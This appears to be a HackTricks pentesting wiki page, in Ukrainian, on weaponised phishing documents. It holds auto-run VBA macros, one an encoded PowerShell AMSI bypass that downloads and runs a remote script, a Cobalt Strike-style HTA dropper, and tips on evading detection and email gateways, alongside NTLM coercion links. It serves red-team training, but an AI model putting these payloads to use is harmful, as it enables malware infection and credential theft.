# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word виконує валідацію даних файлу перед його відкриттям. Валідація даних виконується у формі ідентифікації структури даних, відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає помилка, файл, що аналізується, не буде відкритий.

Зазвичай файли Word, що містять макроси, використовують розширення `.docm`. Однак можливо перейменувати файл, змінивши розширення файлу, і все ще зберегти їх можливості виконання макросів.\
Наприклад, файл RTF за замовчуванням не підтримує макроси, але файл DOCM, перейменований в RTF, буде оброблений Microsoft Word і зможе виконувати макроси.\
Ті ж самі внутрішні механізми застосовуються до всього програмного забезпечення Microsoft Office Suite (Excel, PowerPoint тощо).

Ви можете використовувати наступну команду, щоб перевірити, які розширення будуть виконані деякими програмами Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX файли, що посилаються на віддалений шаблон (Файл – Параметри – Додатки – Керувати: Шаблони – Перейти), можуть також "виконувати" макроси.

### Завантаження зовнішнього зображення

Перейдіть до: _Вставити --> Швидкі частини --> Поле_\
&#xNAN;_**Категорії**: Посилання та довідки, **Імена полів**: includePicture, і **Ім'я файлу або URL**:_ http://\<ip>/whatever

![](<../../images/image (155).png>)

### Макроси Бекдор

Можливо використовувати макроси для виконання довільного коду з документа.

#### Автозавантажувані функції

Чим більше вони поширені, тим більше ймовірність, що AV їх виявить.

- AutoOpen()
- Document_Open()

#### Приклади коду макросів
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Вручну видалити метадані

Перейдіть до **File > Info > Inspect Document > Inspect Document**, що відкриє Document Inspector. Натисніть **Inspect**, а потім **Remove All** поруч із **Document Properties and Personal Information**.

#### Розширення документа

Коли закінчите, виберіть у спадному меню **Save as type**, змініть формат з **`.docx`** на **Word 97-2003 `.doc`**.\
Зробіть це, тому що ви **не можете зберегти макроси всередині `.docx`** і є **стигма** **навколо** розширення, що підтримує макроси **`.docm`** (наприклад, значок ескізу має величезний `!`, і деякі веб/електронні шлюзи блокують їх повністю). Тому це **спадкове розширення `.doc` є найкращим компромісом**.

#### Генератори шкідливих макросів

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Файли

HTA - це програма Windows, яка **поєднує HTML та мови сценаріїв (такі як VBScript та JScript)**. Вона генерує інтерфейс користувача та виконується як "повністю довірена" програма, без обмежень моделі безпеки браузера.

HTA виконується за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, що робить **`mshta` залежним від IE**. Тому, якщо він був видалений, HTA не зможуть виконуватися.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Примусова аутентифікація NTLM

Існує кілька способів **примусити аутентифікацію NTLM "віддалено"**, наприклад, ви можете додати **невидимі зображення** до електронних листів або HTML, до яких отримувач отримуватиме доступ (навіть HTTP MitM?). Або надіслати жертві **адресу файлів**, які **запустять** **аутентифікацію** лише для **відкриття папки.**

**Перевірте ці ідеї та інші на наступних сторінках:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Реле NTLM

Не забувайте, що ви можете не лише вкрасти хеш або аутентифікацію, але й **виконувати атаки реле NTLM**:

- [**Атаки реле NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (реле NTLM до сертифікатів)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{{#include ../../banners/hacktricks-training.md}}
